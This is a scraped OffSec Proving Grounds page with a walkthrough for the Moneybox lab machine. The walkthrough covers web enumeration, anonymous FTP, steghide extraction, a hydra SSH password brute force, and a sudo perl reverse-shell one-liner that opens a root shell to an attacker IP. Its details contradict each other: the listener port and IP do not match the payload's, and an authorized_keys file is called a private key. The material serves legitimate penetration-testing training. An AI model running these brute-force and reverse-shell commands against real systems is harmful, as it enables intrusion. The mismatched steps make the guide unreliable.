@@ -1,0 +1,258 @@
+
+Explore
+Search for keywords, skills, job roles
+My Kali
+VPN
+
+simonfranc
+Proving Grounds Play
+Getting started
+Rules of the game
+Leaderboard
+Search by name
+All (51)
+Warm up (33)
+Get to work (15)
+Try harder (3)
+NAME
+(CLICK TO SORT ASCENDING)	
+IP ADDRESS
+POINTS
+(CLICK TO SORT ASCENDING)	
+DIFFICULTY
+(CLICK TO SORT ASCENDING)	
+LAST ACTION
+(CLICK TO SORT ASCENDING)	
+PROGRESS
+(CLICK TO SORT ASCENDING)	
+Moneybox	
+192.168.56.230
+5	Easy	about 1 hour ago	
+Djinn3	
+10	Hard	Never	
+InsanityHosting	
+10	Hard	Never	
+Katana	
+5	Easy	Never	
+Election1	
+8	Intermediate	Never	
+SunsetMidnight	
+8	Intermediate	Never	
+Sar	
+5	Easy	Never	
+Assertion101	
+8	Intermediate	Never	
+EvilBox-One	
+5	Easy	Never	
+Loly	
+8	Intermediate	Never	
+Vegeta1	
+5	Easy	Never	
+DC-4	
+8	Intermediate	Never	
+CyberSploit1	
+5	Easy	Never	
+ICMP	
+8	Intermediate	Never	
+Lampiao	
+5	Easy	Never	
+Empire-breakout	
+5	Easy	Never	
+Tre	
+8	Intermediate	Never	
+DriftingBlues6	
+5	Easy	Never	
+Monitoring	
+5	Easy	Never	
+Stapler	
+8	Intermediate	Never	
+© 2024  OffSec | Privacy | Terms of service
+
+WALKTHROUGH
+×
+Exploitation Guide for Moneybox
+Summary
+In this guide, we will thoroughly enumerate a web application to find a secret key which which we will use along with bruteforcing SSH in to gain initial access. We will escalate privileges by exploiting a vulnerable SUID binary in order to obtain root access.
+
+Enumeration
+We begin the enumeration process with an nmap scan.
+
+┌──(kali㉿kali)-[~]
+└─$ nmap 192.168.12.239
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-03 05:42 MST
+Nmap scan report for MoneyBox.lan (192.168.12.239)
+Host is up (0.0019s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+We see ports 21, 22, and 80 open on the target machine.
+
+Starting with port 80 we see the following webpage.
+
+home
+home
+Turning our attention toward content discovery, we can bruteforce directories using gobuster.
+
+From the output we see the /blogs/ directory, which reveals the following webpage.
+
+hidden
+hidden
+Viewing the source of the webpage, a hint reveals a hidden directory /S3cr3t-T3xt/.
+
+┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.12.239/blogs/
+<html>
+<head><title>MoneyBox</title></head>
+<body>
+    <h1>I'm T0m-H4ck3r</h1>
+        <p>I Already Hacked This Box and Informed.But They didn't Do any Security configuration</p>
+        <p>If You Want Hint For Next Step......?<p>
+</body>
+</html>
+....
+<!--the hint is the another secret directory is S3cr3t-T3xt-->
+Navigating to /S3cr3t-T3xt/, we are redirected to the following webpage.
+
+third
+third
+Viewing the source of the webpage, a hint reveals a secret key 3xtr4ctd4t4.
+
+┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.12.239/S3cr3t-T3xt/
+<html>
+<head><title>MoneyBox</title></head>
+<body>
+    <h1>There is Nothing In this Page.........</h1>
+</body>
+</html>
+.....
+
+<!..Secret Key 3xtr4ctd4t4 >
+Moving on to port 21, we login with default credentials and find a file trytofind.jpg.
+
+┌──(kali㉿kali)-[~]
+└─$ ftp 192.168.12.239       
+Connected to 192.168.12.239.
+220 (vsFTPd 3.0.3)
+Name (192.168.12.239:kali): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||58729|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg
+226 Directory send OK.
+We download trytofind.jpg to our machine for further analysis.
+
+tp> get trytofind.jpg
+local: trytofind.jpg remote: trytofind.jpg
+229 Entering Extended Passive Mode (|||6207|)
+150 Opening BINARY mode data connection for trytofind.jpg (1093656 bytes).
+100% |********************************|  1068 KiB   28.93 MiB/s    00:00 ETA
+226 Transfer complete.
+1093656 bytes received in 00:00 (27.89 MiB/s)
+ftp> 
+Opening the file reveals a plain image.
+
+We can use steghide to analyze any information hidden in the image using steganography.
+
+However when attempting to extract interesting ifnromation, we see that the file is password protected.
+
+┌──(kali㉿kali)-[~]
+└─$ steghide --extract -sf trytofind.jpg 
+Enter passphrase: 
+Turning to the secret key we found during our earlier enumeration, we can enter 3xtr4ctd4t4 to bypass the password restriction.
+
+┌──(kali㉿kali)-[~]
+└─$ steghide --extract -sf trytofind.jpg 
+Enter passphrase: 
+wrote extracted data to "data.txt".
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ cat data.txt              
+Hello.....  renu
+
+      I tell you something Important.Your Password is too Week So Change Your Password
+Don't Underestimate it.......
+We found another hint hidden in trytofind.jpg which reveals that the user renu is warned about using a very weak password.
+
+We will now attempt to brute force SSH for the username renu using hydra.
+
+┌──(kali㉿kali)-[~]
+└─$ hydra -l renu -P rockyou.txt 192.168.12.239 ssh 
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-29 06:04:46
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://192.168.12.239:22/
+[22][ssh] host: 192.168.12.239   login: renu   password: 987654321
+1 of 1 target successfully completed, 1 valid password found
+From the output we see the password 987654321.
+
+We can login to SSH with the credentials renu:987654321.
+
+┌──(kali㉿kali)-[~]
+└─$ ssh renu@192.168.12.239
+renu@192.168.12.239's password: 
+Linux MoneyBox 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Oct  3 06:05:07 2022 from 192.168.12.134
+renu@MoneyBox:~$ id
+uid=1001(renu) gid=1001(renu) groups=1001(renu)
+Privilege Escalation
+Once on the box, we see two users renu and lily.
+
+renu@MoneyBox:/home$ ls
+lily  renu
+Upon further enumeration, we find a private key for the user lily.
+
+renu@MoneyBox:/home/lily/.ssh$ ls
+authorized_keys
+renu@MoneyBox:/home/lily/.ssh$ cat authorized_keys 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRIE9tEEbTL0A+7n+od9tCjASYAWY0XBqcqzyqb2qsNsJnBm8cBMCBNSktugtos9HY9hzSInkOzDn3RitZJXuemXCasOsM6gBctu5GDuL882dFgz962O9TvdF7JJm82eIiVrsS8YCVQq43migWs6HXJu+BNrVbcf+xq36biziQaVBy+vGbiCPpN0JTrtG449NdNZcl0FDmlm2Y6nlH42zM5hCC0HQJiBymc/I37G09VtUsaCpjiKaxZanglyb2+WLSxmJfr+EhGnWOpQv91hexXd7IdlK6hhUOff5yNxlvIVzG2VEbugtJXukMSLWk2FhnEdDLqCCHXY+1V+XEB9F3 renu@debian
+We can use the private key to authenticate as the user lily directly from the victim machine.
+
+renu@MoneyBox:/home/lily/.ssh$ ssh lily@127.0.0.1
+The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
+......
+lily@MoneyBox:~$ id
+uid=1000(lily) gid=1000(lily) groups=1000(lily),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+Checking permissions using sudo -l, we see that the user lily is permitted to run /usr/bin/perl.
+
+lily@MoneyBox:~$ sudo -l
+Matching Defaults entries for lily on MoneyBox:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User lily may run the following commands on MoneyBox:
+    (ALL : ALL) NOPASSWD: /usr/bin/perl
+Using a perl reverse shell payload, we can attempt to escalate privileges.
+
+We begin by setting up a listener on our attack machine.
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -lvnp 1234 
+Now we enter our reverse shell payload on our victim machine.
+
+lily@MoneyBox:~$ sudo perl -e 'use Socket;$i="192.168.49.56";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+We have obtained root access.
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -lvnp 1234                      
+[sudo] password for kali: 
+listening on [any] 1234 ...
+connect to [192.168.12.134] from (UNKNOWN) [192.168.12.239] 34912
+# id
+uid=0(root) gid=0(root) groups=0(root)
